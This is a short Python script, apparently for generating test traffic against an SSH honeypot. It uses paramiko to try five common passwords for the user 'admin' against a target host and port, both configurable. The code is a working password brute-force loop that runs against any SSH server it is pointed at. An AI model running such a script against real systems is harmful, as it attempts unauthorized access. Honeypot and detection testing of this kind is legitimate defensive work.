# simulate_ssh_bruteforce.py
import paramiko
import time
import sys

target = sys.argv[1] if len(sys.argv)>1 else "10.239.111.151"
port = int(sys.argv[2]) if len(sys.argv)>2 else 2222
username = "admin"
passwords = ["1234", "password", "admin", "letmein", "toor"]

client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

for p in passwords:
    try:
        print(f"Trying {username}:{p}")
        client.connect(target, port=port, username=username, password=p, timeout=5, allow_agent=False, look_for_keys=False)
        print("Unexpected success (shouldn't happen on honeypot)")
        client.close()
    except paramiko.AuthenticationException:
        print("Auth failed (expected)")
    except Exception as e:
        print("Other error:", e)
    time.sleep(1)
